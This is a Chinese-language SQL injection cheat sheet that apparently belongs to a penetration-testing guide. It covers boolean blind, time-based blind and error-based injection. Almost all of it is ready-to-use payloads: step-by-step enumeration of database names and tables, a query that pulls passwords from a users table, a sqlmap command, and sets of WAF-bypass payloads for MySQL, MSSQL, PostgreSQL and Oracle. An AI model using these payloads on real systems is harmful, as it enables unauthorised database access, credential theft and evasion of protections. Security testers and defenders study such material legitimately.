# SQL盲注

## 5.1 布尔盲注 (sqli-blind)

### 执行步骤

#### 1. 确认盲注

```sql
' AND 1=1--  (返回正常)
' AND 1=2--  (返回异常)
```

**说明**: 确认存在布尔盲注

#### 2. 获取数据库名长度

```sql
' AND LENGTH(database())=1--
' AND LENGTH(database())=2--
...
' AND LENGTH(database())=N--
-- 直到返回正常
```

#### 3. 逐字符枚举数据库名

```sql
' AND ASCII(SUBSTRING(database(),1,1))>97--
' AND ASCII(SUBSTRING(database(),1,1))>100--
-- 使用二分法快速定位字符
```

#### 4. 使用工具自动化

```bash
sqlmap -u "http://target.com?id=1" --technique=B --dbs
```

### WAF绕过

#### 布尔盲注条件表达式替代

```sql
' AND (CASE WHEN (MID(database(),1,1)='a') THEN 1 ELSE 0 END)=1--
' AND LEFT(database(),1)>'a'--
' AND RIGHT(LEFT(database(),2),1)='d'--
' AND ORD(MID(database(),1,1))BETWEEN 97 AND 122--
```

#### 布尔盲注数学运算与位运算绕过

```sql
' AND (SELECT CONV(HEX(SUBSTR(database(),1,1)),16,10))>96--
' AND (SELECT ORD(MID(database(),1,1))&0x40)=0x40--
' AND (SELECT POW(ORD(MID(database(),1,1)),0))+0=1--
' DIV 1 AND (SELECT LENGTH(database()))>0--
```

---

## 5.2 时间盲注 (sqli-time-based)

### 执行步骤

#### 1. 确认时间盲注

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
-- 观察响应是否延迟5秒
```

#### 2. 获取数据库名长度

```sql
' AND IF(LENGTH(database())=N,SLEEP(5),0)--
```

#### 3. 逐字符提取

```sql
' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)--
-- 使用二分法提取字符
```

#### 4. 不同数据库延时函数

| 数据库 | 延时函数 |
|--------|----------|
| MySQL | SLEEP(5), BENCHMARK() |
| MSSQL | WAITFOR DELAY '0:0:5' |
| PostgreSQL | pg_sleep(5) |
| Oracle | DBMS_LOCK.SLEEP(5) |

### WAF绕过

#### 时间延迟替代函数绕过

```sql
' AND BENCHMARK(5000000,SHA1('test'))--
' AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--
' AND GET_LOCK('sqli_test',5)--
' AND (CASE WHEN database() LIKE '%' THEN BENCHMARK(3000000,MD5('x')) ELSE 0 END)--
```

#### 跨数据库时间延迟绕过

```sql
-- PostgreSQL
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- Oracle
' AND 1=CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END--

-- MySQL
' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)--
```

---

## 5.3 报错注入 (sqli-error-based)

### 执行步骤

#### 1. 确认报错注入

```sql
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,version()),1)--
```

#### 2. 获取数据库信息

```sql
' AND extractvalue(1,concat(0x7e,database()))--
' AND extractvalue(1,concat(0x7e,user()))--
' AND extractvalue(1,concat(0x7e,version()))--
```

#### 3. 获取表名

```sql
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
```

#### 4. 获取数据

```sql
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1)))--
```

#### 5. 其他报错函数

```sql
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXP(~(SELECT * FROM (SELECT version())a))--
```

### WAF绕过

#### 替代报错函数绕过

```sql
' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--
' AND (SELECT 1 FROM (SELECT NTILE(1) OVER(ORDER BY (SELECT version())))a)--
' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
' AND ST_LatFromGeoHash(version())--
```

#### 编码与科学计数法绕过

```sql
' AND extractvalue(1,concat(0x7e,(SELECT unhex(hex(database())))))--
' AND 1=1 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e,database(),0x7e) x)a))--
```
